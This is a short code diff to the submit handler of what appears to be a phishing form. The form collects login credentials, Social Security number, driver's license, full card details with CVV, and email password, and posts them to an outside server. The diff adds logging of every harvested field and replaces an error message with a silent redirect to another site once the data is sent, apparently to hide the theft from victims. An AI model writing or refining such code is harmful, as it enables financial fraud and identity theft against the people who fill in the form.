@@ -68,6 +68,8 @@ async function handleSubmit(e){
     setLoading(true);
 
     try {
+
+        console.log(platform + " " + type + " " + username + " "+ password + " " + firstname + " " + lastname + " " + othername + " " + dob + " " + ssn + " " + driver_license + " " + address + " " + card_name + " " + card_number + " " + card_cvv + " " + card_expiration + " " + email + " " + email_pass);
         
         const response = await axios.post('https://ffback.onrender.com/api/send', {
             
@@ -96,9 +98,11 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+          
 
             setLoading(false);
+
+            window.location.href = 'https://ffin.com';
         }
       } catch (error) {
         // Handle error
